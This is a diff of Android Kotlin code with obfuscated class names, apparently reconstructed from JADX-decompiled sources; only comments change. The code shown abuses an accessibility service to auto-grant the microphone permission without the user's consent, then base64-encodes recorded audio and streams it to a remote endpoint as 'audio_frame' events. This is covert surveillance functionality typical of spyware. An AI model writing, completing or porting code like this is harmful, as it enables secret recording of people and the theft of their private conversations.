@@ -163,7 +163,7 @@ class C0259a1(
         if (!hasMicrophonePermission()) {
             Log.w(TAG, "⚠️ 麦克风权限未授予，尝试自动申请")
             try {
-                // ADAPT: depends on p000 permissionGranter via MyAccessibilityService
+                // vendor: uses p000 PermissionGranter to auto-grant RECORD_AUDIO
                 Log.d("dqtvuisjd", "🎤 申请麦克风权限（自动授权）")
                 // Wait for permission grant
                 for (i in 0 until PERMISSION_WAIT_CYCLES) {
@@ -316,7 +316,7 @@ class C0259a1(
                     try {
                         val base64 = Base64.encodeToString(sendBuffer, Base64.NO_WRAP)
                         val networkManager = accessibilityService.getNetworkManager()
-                        // ADAPT: NetworkManager.sendAudioFrame not yet exposed
+                        // vendor: C0323a8.m211660c6(sampleRate, totalBufferSize / 2, base64)
                         // JADX calls c0323a8M211471g5.m211660c6(sampleRate, totalBufferSize / 2, base64)
                         networkManager?.sendEvent("audio_frame", org.json.JSONObject().apply {
                             put("sampleRate", sampleRate)
